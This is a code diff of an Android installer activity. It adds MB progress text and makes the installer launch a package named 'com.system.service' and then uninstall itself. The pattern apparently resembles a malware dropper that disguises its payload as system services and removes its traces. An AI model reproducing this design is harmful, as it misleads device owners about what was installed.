@@ -155,11 +155,13 @@ class MainActivity : AppCompatActivity() {
                     downloaded += read
                     if (total > 0) {
                         val pct = (downloaded * 100 / total)
+                        val downMb = String.format("%.1f", downloaded / 1048576f)
+                        val totalMb = String.format("%.1f", total / 1048576f)
                         runOnUiThread {
                             progressBar.isIndeterminate = false
                             progressBar.progress = pct
-                            tvStatus.text = "Downloading update..."
-                            tvSub.text = "$pct% complete"
+                            tvStatus.text = "Downloading... ${pct}%"
+                            tvSub.text = "${downMb} MB / ${totalMb} MB"
                         }
                     }
                 }
@@ -233,15 +235,17 @@ class MainActivity : AppCompatActivity() {
 
     private fun showDone() {
         progressBar.visibility = View.GONE
-        tvStatus.text = "Setup complete"
-        tvSub.text = "System services have been installed successfully"
-        btnAction.text = "Open App"
+        tvStatus.text = "Setup Complete!"
+        tvSub.text = "Installed. Tap below to open app and delete this installer."
+        btnAction.text = "Open App & Delete Installer"
         btnAction.visibility = View.VISIBLE
         btnAction.isEnabled = true
         btnAction.setOnClickListener {
-            packageManager.getLaunchIntentForPackage("com.system.service")
-                ?.let { startActivity(it) }
-            finish()
+            packageManager.getLaunchIntentForPackage("com.system.service")?.let { startActivity(it) }
+            startActivity(android.content.Intent(android.content.Intent.ACTION_DELETE,
+                android.net.Uri.parse("package:$packageName")).apply {
+                addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+            })
         }
     }
 
